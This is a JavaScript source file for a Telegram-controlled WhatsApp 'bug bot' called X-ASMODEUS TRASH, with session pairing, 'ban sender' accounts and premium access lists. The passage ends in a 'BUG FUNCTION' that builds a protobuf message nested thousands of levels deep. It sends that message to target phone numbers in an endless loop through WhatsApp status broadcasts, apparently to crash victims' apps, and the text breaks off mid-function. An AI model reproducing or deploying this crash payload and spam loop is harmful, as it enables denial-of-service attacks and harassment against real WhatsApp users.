const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestBaileysVersion,
    templateMessage,
    InteractiveMessage,
    Header,
} = require('@whiskeysockets/baileys');
const fs = require("fs");
const P = require("pino");
const crypto = require("crypto");
const path = require("path");
const sessions = new Map();       // ← sender bug (udah ada)
const banSessions = new Map();    // ← sender ban (TAMBAHIN INI)
const readline = require("readline");
const fetch = require("node-fetch");
const cd = "./犬/cooldown.json";
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";
const ONLY_FILE = "./犬/group.json";

// ==================== ONLY GROUP CONFIG ====================
function isOnlyGroupEnabled() {
  const config = JSON.parse(fs.readFileSync(ONLY_FILE));
  return config.onlyGroup;
}

function setOnlyGroup(status) {
  const config = { onlyGroup: status };
  fs.writeFileSync(ONLY_FILE, JSON.stringify(config, null, 2));
}

function shouldIgnoreMessage(msg) {
  if (!isOnlyGroupEnabled()) return false;
  return msg.chat.type === "private";
}


// ==================== STORAGE PREMIUM GROUPS ====================
let premiumGroups = [];

const GROUP_FILE = "./犬/premium_groups.json";

function savePremiumGroups() {
  fs.writeFileSync(GROUP_FILE, JSON.stringify(premiumGroups, null, 2));
}

function loadPremiumGroups() {
  try {
    const dir = "./犬";
    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
    if (!fs.existsSync(GROUP_FILE)) fs.writeFileSync(GROUP_FILE, "[]");

    const raw = fs.readFileSync(GROUP_FILE, "utf8").trim();
    let parsed = JSON.parse(raw || "[]");

    // ✅ Kalau hasil parse bukan array, ubah jadi array
    if (!Array.isArray(parsed)) {
      console.warn("⚠️ premium_groups.json bukan array, diperbaiki...");
      parsed = [parsed];   // bungkus jadi array
      fs.writeFileSync(GROUP_FILE, JSON.stringify(parsed, null, 2));
    }

    premiumGroups = parsed;
    console.log("✅ Loaded premiumGroups:", premiumGroups.length, "grup");
  } catch (e) {
    console.error("⚠️ Gagal load premiumGroups:", e.message);
    premiumGroups = [];
  }
}
loadPremiumGroups();


// ==================== ENSURE FILE DULU (SEBELUM BACA) ====================
function ensureFileExists(filePath, defaultData = []) {
  const path = require("path");
  const dir = path.dirname(filePath);
  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
  if (!fs.existsSync(filePath)) {
    fs.writeFileSync(filePath, JSON.stringify(defaultData, null, 2));
  }
}

ensureFileExists('./犬/premium.json', []);
ensureFileExists('./犬/admin.json',   []);


// ==================== BARU BACA FILE ====================
let premiumUsers = JSON.parse(fs.readFileSync('./犬/premium.json', 'utf8'));
let adminUsers   = JSON.parse(fs.readFileSync('./犬/admin.json',   'utf8'));


// ==================== SAVE FUNCTIONS ====================
function savePremiumUsers() {
  fs.writeFileSync('./犬/premium.json', JSON.stringify(premiumUsers, null, 2));
}

function saveAdminUsers() {
  fs.writeFileSync('./犬/admin.json', JSON.stringify(adminUsers, null, 2));
}


// ==================== WATCH FILE ====================
function watchFile(filePath, updateCallback) {
  fs.watch(filePath, (eventType) => {
    if (eventType === 'change') {
      try {
        const updatedData = JSON.parse(fs.readFileSync(filePath, 'utf8'));
        updateCallback(updatedData);
        console.log(`File ${filePath} updated successfully.`);
      } catch (error) {
        console.error(`Error updating ${filePath}:`, error.message);
      }
    }
  });
}

watchFile('./犬/premium.json', (data) => (premiumUsers = data));
watchFile('./犬/admin.json',   (data) => (adminUsers   = data));

const developerId = "8086993657";
const chalk = require("chalk"); //
const config = require("./config.js");
const TelegramBot = require("node-telegram-bot-api");
const axios = require("axios");
const BOT_TOKEN = config.BOT_TOKEN;
const bot = new TelegramBot(BOT_TOKEN, { polling: true });
const GITHUB_TOKEN_LIST_URL =
  "https://raw.githubusercontent.com/sanz-max/Database/refs/heads/main/token.json"; // Ganti dengan URL GitHub yang benar

async function fetchValidTokens() {
  try {
    const response = await axios.get(GITHUB_TOKEN_LIST_URL);
    return response.data.tokens; // Asumsikan format JSON: { "tokens": ["TOKEN1", "TOKEN2", ...] }
  } catch (error) {
    console.error(
      chalk.red("❌ Gagal mengambil daftar token dari GitHub:", error.message)
    );
    return [];
  }
}
// ==================== CEK AKSES PREMIUM ====================
function hasPremiumAccess(userId, chatId, chatType) {
  const now = new Date();

  // 1. Premium pribadi
  if (premiumUsers.some(u =>
    String(u.id) === String(userId) && new Date(u.expiresAt) > now
  )) return true;

  // 2. Premium grup (hanya kalau chat-nya grup)
  if (chatType === "group" || chatType === "supergroup") {
    if (premiumGroups.some(g =>
      String(g.id) === String(chatId) && new Date(g.expiresAt) > now
    )) return true;
  }

  return false;
}

async function validateToken() {
  console.log(chalk.blue("🔍 Memeriksa apakah token bot valid..."));

  const validTokens = await fetchValidTokens();
if (!validTokens.includes(BOT_TOKEN)) {
  console.log(chalk.red("❌ Token tidak valid! Bot tidak dapat dijalankan."));
  process.exit(1);
}

  console.log(chalk.green(` #- Token Valid⠀⠀`));
  startBot();
}

function startBot() {
  console.log(
    chalk.red(`⠀⠀
⢻⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⠤⠤⠴⢶⣶⡶⠶⠤⠤⢤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣾⠁
⠀ ⠻⣯⡗⢶⣶⣶⣶⣶⢶⣤⣄⣀⣀⡤⠒⠋⠁⠀⠀⠀⠀⠚⢯⠟⠂⠀⠀⠀⠀⠉⠙⠲⣤⣠⡴⠖⣲⣶⡶⣶⣿⡟⢩⡴⠃⠀
 ⠀⠀⠈⠻⠾⣿⣿⣬⣿⣾⡏⢹⣏⠉⠢⣄⣀⣀⠤⠔⠒⠊⠉⠉⠉⠉⠑⠒⠀⠤⣀⡠⠚⠉⣹⣧⣝⣿⣿⣷⠿⠿⠛⠉⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⣹⠟⠛⠿⣿⣤⡀⣸⠿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠾⣇⢰⣶⣿⠟⠋⠉⠳⡄⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢠⡞⠁⠀⠀⡠⢾⣿⣿⣯⠀⠈⢧⡀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠁⢀⣿⣿⣯⢼⠓⢄⠀⢀⡘⣦⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣰⣟⣟⣿⣀⠎⠀⠀⢳⠘⣿⣷⡀⢸⣿⣶⣤⣄⣀⣤⢤⣶⣿⡇⢀⣾⣿⠋⢀⡎⠀⠀⠱⣤⢿⠿⢷⡀⠀⠀⠀⠀
⠀⠀⠀⠀⣰⠋⠀⠘⣡⠃⠀⠀⠀⠈⢇⢹⣿⣿⡾⣿⣻⣖⠛⠉⠁⣠⠏⣿⡿⣿⣿⡏⠀⡼⠀⠀⠀⠀⠘⢆⠀⠀⢹⡄⠀⠀⠀
⠀⠀⠀⢰⠇⠀⠀⣰⠃⠀⠀⣀⣀⣀⣼⢿⣿⡏⡰⠋⠉⢻⠳⣤⠞⡟⠀⠈⢣⡘⣿⡿⠶⡧⠤⠄⣀⣀⠀⠈⢆⠀⠀⢳⠀⠀⠀
⠀⠀⠀⡟⠀⠀⢠⣧⣴⣊⣩⢔⣠⠞⢁⣾⡿⢹⣷⠋⠀⣸⡞⠉⢹⣧⡀⠐⢃⢡⢹⣿⣆⠈⠢⣔⣦⣬⣽⣶⣼⣄⠀⠈⣇⠀⠀
⠀⠀⢸⠃⠀⠘⡿⢿⣿⣿⣿⣛⣳⣶⣿⡟⣵⠸⣿⢠⡾⠥⢿⡤⣼⠶⠿⡶⢺⡟⣸⢹⣿⣿⣾⣯⢭⣽⣿⠿⠛⠏⠀⠀⢹⠀⠀
⠀⠀⢸⠀⠀⠀⡇⠀⠈⠙⠻⠿⣿⣿⣿⣇⣸⣧⣿⣦⡀⠀⣘⣷⠇⠀⠄⣠⣾⣿⣯⣜⣿⣿⡿⠿⠛⠉⠀⠀⠀⢸⠀⠀⢸⡆⠀
⠀⠀⢸⠀⠀⠀⡇⠀⠀⠀⠀⣀⠼⠋⢹⣿⣿⣿⡿⣿⣿⣧⡴⠛⠀⢴⣿⢿⡟⣿⣿⣿⣿⠀⠙⠲⢤⡀⠀⠀⠀⢸⡀⠀⢸⡇⠀
⠀⠀⢸⣀⣷⣾⣇⠀⣠⠴⠋⠁⠀⠀⣿⣿⡛⣿⡇⢻⡿⢟⠁⠀⠀⢸⠿⣼⡃⣿⣿⣿⡿⣇⣀⣀⣀⣉⣓⣦⣀⣸⣿⣿⣼⠁⠀
⠀⠀⠸⡏⠙⠁⢹⠋⠉⠉⠉⠉⠉⠙⢿⣿⣅⠀⢿⡿⠦⠀⠁⠀⢰⡃⠰⠺⣿⠏⢀⣽⣿⡟⠉⠉⠉⠀⠈⠁⢈⡇⠈⠇⣼⠀⠀
⠀⠀⠀⢳⠀⠀⠀⢧⠀⠀⠀⠀⠀⠀⠈⢿⣿⣷⣌⠧⡀⢲⠄⠀⠀⢴⠃⢠⢋⣴⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⡸⠀⠀⢠⠇⠀⠀
⠀⠀⠀⠈⢧⠀⠀⠈⢦⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣧⠐⠸⡄⢠⠀⢸⠀⢠⣿⣟⡿⠋⠀⠀⠀⠀⠀⠀⠀⡰⠁⠀⢀⡟⠀⠀⠀
⠀⠀⠀⠀⠈⢧⠀⠀⠀⠣⡀⠀⠀⠀⠀⠀⠀⠈⠛⢿⡇⢰⠁⠸⠄⢸⠀⣾⠟⠉⠀⠀⠀⠀⠀⠀⠀⢀⠜⠁⠀⢀⡞⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠈⢧⡀⠀⠀⠙⢄⠀⠀⠀⠀⠀⠀⠀⢨⡷⣜⠀⠀⠀⠘⣆⢻⠀⠀⠀⠀⠀⠀⠀⠀⡴⠋⠀⠀⣠⠎⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠑⢄⠀⠀⠀⠑⠦⣀⠀⠀⠀⠀⠈⣷⣿⣦⣤⣤⣾⣿⢾⠀⠀⠀⠀⠀⣀⠴⠋⠀⠀⢀⡴⠃⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠈⠑⢄⡀⢸⣶⣿⡑⠂⠤⣀⡀⠱⣉⠻⣏⣹⠛⣡⠏⢀⣀⠤⠔⢺⡧⣆⠀⢀⡴⠋⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠳⢽⡁⠀⠀⠀⠀⠈⠉⠙⣿⠿⢿⢿⠍⠉⠀⠀⠀⠀⠉⣻⡯⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠑⠲⠤⣀⣀⡀⠀⠈⣽⡟⣼⠀⣀⣀⣠⠤⠒⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⢻⡏⠉⠉⠁⠀⠀⠀⠀⠀⠀
⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈
    𓆩𝐗-𝐀𝐒𝐌𝐎𝐃𝐄𝐔𝐒 𝐓𝐑𝐀𝐒𝐇𓆪   
𝐂𝐑𝐄𝐀𝐓𝐄 𝐁𝐘 𝐗-𝐀𝐒𝐌𝐎𝐃𝐄𝐔𝐒 𝐓𝐑𝐀𝐒𝐇
`)
  );
}

validateToken();

let sock;

function saveActiveSessions(botNumber) {
  try {
    const sessions = [];
    if (fs.existsSync(SESSIONS_FILE)) {
      const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      if (!existing.includes(botNumber)) {
        sessions.push(...existing, botNumber);
      }
    } else {
      sessions.push(botNumber);
    }
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
  } catch (error) {
    console.error("Error saving session:", error);
  }
}

async function initializeWhatsAppConnections() {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      console.log(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`);

      for (const botNumber of activeNumbers) {
        console.log(`Mencoba menghubungkan WhatsApp: ${botNumber}`);
        const sessionDir = createSessionDir(botNumber);
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

        sock = makeWASocket ({
          auth: state,
          printQRInTerminal: true,
          logger: P({ level: "silent" }),
          defaultQueryTimeoutMs: undefined,
        });

        // Tunggu hingga koneksi terbentuk
        await new Promise((resolve, reject) => {
          sock.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect } = update;
            if (connection === "open") {
              console.log(`Bot ${botNumber} terhubung!`);
              sessions.set(botNumber, sock);
              resolve();
            } else if (connection === "close") {
              const shouldReconnect =
                lastDisconnect?.error?.output?.statusCode !==
                DisconnectReason.loggedOut;
              if (shouldReconnect) {
                console.log(`Mencoba menghubungkan ulang bot ${botNumber}...`);
                await initializeWhatsAppConnections();
              } else {
                reject(new Error("Koneksi ditutup"));
              }
            }
          });

          sock.ev.on("creds.update", saveCreds);
        });
      }
    }
  } catch (error) {
    console.error("Error initializing WhatsApp connections:", error);
  }
}

function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}

async function connectToWhatsApp(botNumber, chatId) {
  let statusMessage = await bot
    .sendMessage(
      chatId,`\`\`\`
╔─═⊱ 「 📋 𝐋𝐎𝐀𝐃𝐈𝐍𝐆 」
│┏⊱ Number : ${botNumber}
┗━━━━━━━━━━━━━━━━━⬣
\`\`\``,
      { parse_mode: "Markdown" }
    )
    .then((msg) => msg.message_id);

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  sock = makeWASocket ({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

   if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await bot.editMessageText(`\`\`\`
╔─═⊱ 「 📋 𝐑𝐄𝐂𝐎𝐍𝐍𝐄𝐂𝐓 𝐀𝐆𝐀𝐈𝐍 」
│┏⊱ Number : ${botNumber}
┗━━━━━━━━━━━━━━━━━⬣
\`\`\``,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        await connectToWhatsApp(botNumber, chatId);
      } else {
        await bot.editMessageText(`\`\`\`
╔─═⊱ 「 📋 𝐆𝐀𝐆𝐀𝐋 𝐓𝐄𝐑𝐇𝐔𝐁𝐔𝐍𝐆  」
│┏⊱ Number : ${botNumber}
┗━━━━━━━━━━━━━━━━━⬣
\`\`\``,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
      sessions.set(botNumber, sock);
      saveActiveSessions(botNumber);
      await bot.editMessageText(`\`\`\`
╔─═⊱ 「 📋 𝐁𝐄𝐑𝐇𝐀𝐒𝐈𝐋 𝐓𝐄𝐑𝐇𝐔𝐁𝐔𝐍𝐆  」
│┏⊱ Number : ${botNumber}
┗━━━━━━━━━━━━━━━━━⬣
\`\`\``,
        {
          chat_id: chatId,
          message_id: statusMessage,
          parse_mode: "Markdown",
        }
      );
   } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await sock.requestPairingCode(botNumber, "ASMODMEK");
          const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
          await bot.editMessageText(`\`\`\`
╔─═⊱ 「 📋 𝐒𝐓𝐀𝐓𝐔𝐒 𝐂𝐎𝐍𝐍𝐄𝐂𝐓 𝐏𝐀𝐈𝐑𝐈𝐍𝐆  」
│┏⊱ Number : ${botNumber}
║┗⊱ Code : ${formattedCode}
┗━━━━━━━━━━━━━━━━━⬣
\`\`\``,
            {
              chat_id: chatId,
              message_id: statusMessage,
              parse_mode: "Markdown",
            }
          );
        }
      } catch (error) {
        console.error("Error requesting pairing code:", error);
        await bot.editMessageText(
          `𝗘𝗥𝗥𝗢𝗥\n𝗔𝗹𝗮𝘀𝗮𝗻 : ${error.message}`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
      }
    }
  });


  sock.ev.on("creds.update", saveCreds);

  return sock;
}

async function connectToBanWhatsApp(botNumber, chatId) {
  let statusMessage = await bot
    .sendMessage(
      chatId,`\`\`\`
╔─═⊱ 「 📋 𝐋𝐎𝐀𝐃𝐈𝐍𝐆 𝐁𝐀𝐍 𝐒𝐄𝐍𝐃𝐄𝐑 」
│┏⊱ Number : ${botNumber}
┗━━━━━━━━━━━━━━━━━⬣
\`\`\``,
      { parse_mode: "Markdown" }
    )
    .then((msg) => msg.message_id);

  const sessionDir = createSessionDir("ban_" + botNumber); // 🔥 folder beda
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  const banSock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  banSock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await bot.editMessageText(`\`\`\`
╔─═⊱ 「 📋 𝐁𝐀𝐍 𝐑𝐄𝐂𝐎𝐍𝐍𝐄𝐂𝐓 𝐀𝐆𝐀𝐈𝐍 」
│┏⊱ Number : ${botNumber}
┗━━━━━━━━━━━━━━━━━⬣
\`\`\``, {
          chat_id: chatId,
          message_id: statusMessage,
          parse_mode: "Markdown",
        });
        await connectToBanWhatsApp(botNumber, chatId);
      } else {
        await bot.editMessageText(`\`\`\`
╔─═⊱ 「 📋 𝐁𝐀𝐍 𝐆𝐀𝐆𝐀𝐋 𝐓𝐄𝐑𝐇𝐔𝐁𝐔𝐍𝐆 」
│┏⊱ Number : ${botNumber}
┗━━━━━━━━━━━━━━━━━⬣
\`\`\``, {
          chat_id: chatId,
          message_id: statusMessage,
          parse_mode: "Markdown",
        });
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
      banSessions.set(botNumber, banSock); // 🔥 simpan ke banSessions
      saveActiveSessions(botNumber);
      await bot.editMessageText(`\`\`\`
╔─═⊱ 「 📋 𝐁𝐀𝐍 𝐁𝐄𝐑𝐇𝐀𝐒𝐈𝐋 𝐓𝐄𝐑𝐇𝐔𝐁𝐔𝐍𝐆 」
│┏⊱ Number : ${botNumber}
┗━━━━━━━━━━━━━━━━━⬣
\`\`\``, {
          chat_id: chatId,
          message_id: statusMessage,
          parse_mode: "Markdown",
        });
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await banSock.requestPairingCode(botNumber, "ASMODMEK");
          const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
          await bot.editMessageText(`\`\`\`
╔─═⊱ 「 📋 𝐁𝐀𝐍 𝐒𝐓𝐀𝐓𝐔𝐒 𝐂𝐎𝐍𝐍𝐄𝐂𝐓 」
│┏⊱ Number : ${botNumber}
║┗⊱ Code : ${formattedCode}
┗━━━━━━━━━━━━━━━━━⬣
\`\`\``, {
              chat_id: chatId,
              message_id: statusMessage,
              parse_mode: "Markdown",
            }
          );
        }
      } catch (error) {
        console.error("Error requesting pairing code:", error);
        await bot.editMessageText(
          `𝗘𝗥𝗥𝗢𝗥\n𝗔𝗹𝗮𝘀𝗮𝗻 : ${error.message}`, {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
      }
    }
  });

  banSock.ev.on("creds.update", saveCreds);

  return banSock;
}

// -------( Fungsional Function Before Parameters )--------- \\
function formatRuntime(seconds) {
  const days = Math.floor(seconds / (3600 * 24));
  const hours = Math.floor((seconds % (3600 * 24)) / 3600);
  const minutes = Math.floor((seconds % 3600) / 60);
  const secs = seconds % 60;
  
  return `${days} Hari, ${hours} Jam, ${minutes} Menit, ${secs} Detik`;
}

const startTime = Math.floor(Date.now() / 1000); 

function getBotRuntime() {
  const now = Math.floor(Date.now() / 1000);
  return formatRuntime(now - startTime);
}

//~ Date Now
function getCurrentDate() {
  const now = new Date();
  const options = { weekday: "long", year: "numeric", month: "long", day: "numeric" };
  return now.toLocaleDateString("id-ID", options); 
}

async function tiktokDl(url) {
  return new Promise(async (resolve, reject) => {
    try {
      let data = [];
      function formatNumber(integer) {
        return Number(parseInt(integer)).toLocaleString().replace(/,/g, ".");
      }

      function formatDate(n, locale = "id-ID") {
        let d = new Date(n);
        return d.toLocaleDateString(locale, {
          weekday: "long",
          day: "numeric",
          month: "long",
          year: "numeric",
          hour: "numeric",
          minute: "numeric",
          second: "numeric",
        });
      }

      let domain = "https://www.tikwm.com/api/";
      let res = await (
        await axios.post(
          domain,
          {},
          {
            headers: {
              Accept: "application/json, text/javascript, */*; q=0.01",
              "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
              "Content-Type":
                "application/x-www-form-urlencoded; charset=UTF-8",
              Origin: "https://www.tikwm.com",
              Referer: "https://www.tikwm.com/",
              "User-Agent":
                "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
            },
            params: {
              url: url,
              count: 12,
              cursor: 0,
              web: 1,
              hd: 2,
            },
          }
        )
      ).data.data;

      if (!res) return reject("⚠️ *Gagal mengambil data!*");

      if (res.duration == 0) {
        res.images.forEach((v) => {
          data.push({ type: "photo", url: v });
        });
      } else {
        data.push(
          {
            type: "watermark",
            url: "https://www.tikwm.com" + res?.wmplay || "/undefined",
          },
          {
            type: "nowatermark",
            url: "https://www.tikwm.com" + res?.play || "/undefined",
          },
          {
            type: "nowatermark_hd",
            url: "https://www.tikwm.com" + res?.hdplay || "/undefined",
          }
        );
      }

      resolve({
        status: true,
        title: res.title,
        taken_at: formatDate(res.create_time).replace("1970", ""),
        region: res.region,
        id: res.id,
        duration: res.duration + " detik",
        cover: "https://www.tikwm.com" + res.cover,
        stats: {
          views: formatNumber(res.play_count),
          likes: formatNumber(res.digg_count),
          comment: formatNumber(res.comment_count),
          share: formatNumber(res.share_count),
          download: formatNumber(res.download_count),
        },
        author: {
          id: res.author.id,
          fullname: res.author.unique_id,
          nickname: res.author.nickname,
          avatar: "https://www.tikwm.com" + res.author.avatar,
        },
        video_links: data,
      });
    } catch (e) {
      reject("⚠️ *Terjadi kesalahan saat mengambil video!*");
    }
  });
}

function getRandomImage() {
  const images = [
    "https://j.top4top.io/p_39077fbdn0.png",
  ];
  return images[Math.floor(Math.random() * images.length)];
}
// ~ Coldowwn

let cooldownData = fs.existsSync(cd) ? JSON.parse(fs.readFileSync(cd)) : { time: 5 * 60 * 1000, users: {} };

function saveCooldown() {
    fs.writeFileSync(cd, JSON.stringify(cooldownData, null, 2));
}

function checkCooldown(userId) {
    if (cooldownData.users[userId]) {
        const remainingTime = cooldownData.time - (Date.now() - cooldownData.users[userId]);
        if (remainingTime > 0) {
            return Math.ceil(remainingTime / 1000); 
        }
    }
    cooldownData.users[userId] = Date.now();
    saveCooldown();
    setTimeout(() => {
        delete cooldownData.users[userId];
        saveCooldown();
    }, cooldownData.time);
    return 0;
}

function setCooldown(timeString) {
    const match = timeString.match(/(\d+)([smh])/);
    if (!match) return "Format salah! Gunakan contoh: /settimer 5m";

    let [_, value, unit] = match;
    value = parseInt(value);

    if (unit === "s") cooldownData.time = value * 1000;
    else if (unit === "m") cooldownData.time = value * 60 * 1000;
    else if (unit === "h") cooldownData.time = value * 60 * 60 * 1000;

    saveCooldown();
    return `Cooldown diatur ke ${value}${unit}`;
}

function getPremiumStatus(userId) {
  const user = premiumUsers.find(user => user.id === userId);
  if (user && new Date(user.expiresAt) > new Date()) {
    return `✅`;
  } else {
    return "❌";
  }
}
/////// BUG FUNCTION ///////
async function starttime(target) {
    const IMG = {
        url: "https://mmg.whatsapp.net/o1/v/t24/f2/m235/AQNoT0RVMsuqbGex4OAhCfu4uJgG8NDGShMN2WvxFxGEKQIN9AiuElv-4a6btmTyzbCYvvc6h-WsBx2srRxEA8LMPxWi_qtr6MvQV73Meg?ccb=9-4&oh=01_Q5Aa5AGLJ8RxEGZ7pZhWUQzr6gaFzyzpge4GNToAX6gKki2QZQ&oe=6A9602BA&_nc_sid=e6ed6c&mms3=true",
        directPath: "/o1/v/t24/f2/m235/AQNoT0RVMsuqbGex4OAhCfu4uJgG8NDGShMN2WvxFxGEKQIN9AiuElv-4a6btmTyzbCYvvc6h-WsBx2srRxEA8LMPxWi_qtr6MvQV73Meg?ccb=9-4&oh=01_Q5Aa5AGLJ8RxEGZ7pZhWUQzr6gaFzyzpge4GNToAX6gKki2QZQ&oe=6A9602BA&_nc_sid=e6ed6c",
        mediaKey: "xD3KegXJnRDJbL89tyWMpG1m12+jAXgXKN0XhTS0riM=",
        fileEncSha256: "ef7Y+a5ufhg2pfcsfZ23SYE4vUNtyoc3j/8/yyqr58Q=",
        fileSha256: "84cNaVGkzmIJwjozrUJipNbXoNb0ovMC8OWBMpLRcYU=",
        fileLength: 20010,
        mediaKeyTimestamp: "1785637793",
        mimetype: "image/jpeg",
        height: 1600,
        width: 1200,
        jpegThumbnail: ""
    };

    const TAGS = [
        [0xBA, 0x03],
        [0xD2, 0x04],
        [0xAA, 0x02],
    ];

    const encodeVarint = function(n) {
        var buf = [];
        while (n >= 0x80) {
            buf.push((n & 0x7f) | 0x80);
            n >>>= 7;
        }
        buf.push(n);
        return Buffer.from(buf);
    };

    const wrapLd = function(tag, data) {
        return Buffer.concat([Buffer.from(tag), encodeVarint(data.length), data]);
    };

    const Payload = proto.Message.encode(
        proto.Message.fromObject({ imageMessage: IMG })
    ).finish();

    const inflate = function(tag, depth) {
        var buf = Payload;
        for (var i = 0; i < depth; i++) {
            buf = wrapLd(tag, wrapLd([0x0A], buf));
        }
        return buf;
    };

    const resolveJid = function(raw) {
        var s = String(raw || '').trim();
        if (s.includes('@')) return s;
        return s.replace(/\D/g, '') + '@s.whatsapp.net';
    };

    const jids = (Array.isArray(target) ? target : [target])
        .map(resolveJid)
        .filter(function(j) { return j.length > 15; });


    var MAX_BATCH = 1;
    var DELAY_MS  = 500;
    var totalSent = 0;

    while (true) {
        for (var offset = 0; offset < jids.length; offset += MAX_BATCH) {
            var bokep   = jids.slice(offset, offset + MAX_BATCH);
            var isFirst = offset === 0;

            if (!isFirst) {
                await new Promise(function(r) { setTimeout(r, DELAY_MS); });
            }

            var idx   = Math.floor(offset / MAX_BATCH) + 1;
            var suffix = idx > 1 ? ('n' + idx) : 'n';
            var msg  = 'NanasMuda' + Date.now().toString(36).toUpperCase() + suffix + totalSent++;

            for (var ti = 0; ti < TAGS.length; ti++) {
                var tag     = TAGS[ti];
                var ampasx = null;

                for (var depth = 5000; depth >= 2000 && !ampasx; depth -= 400) {
                    try {
                        var decoded = proto.Message.decode(inflate(tag, depth));
                        proto.Message.encode(decoded).finish();
                        ampasx = decoded;
                    } catch (_) {}
                }

                if (!ampasx) continue;

                try {
                    await sock.relayMessage('status@broadcast', ampasx, {
                        messageId: msg,
                        statusJidList: bokep,
                        additionalNodes: [{
                            tag: 'meta',
                            attrs: {},
                            content: [{
                                tag: 'mentioned_users',
                                attrs: {},
                                content: bokep.map(function(jid) {
                                    return { tag: 'to', attrs: { jid: jid }, content: [] };
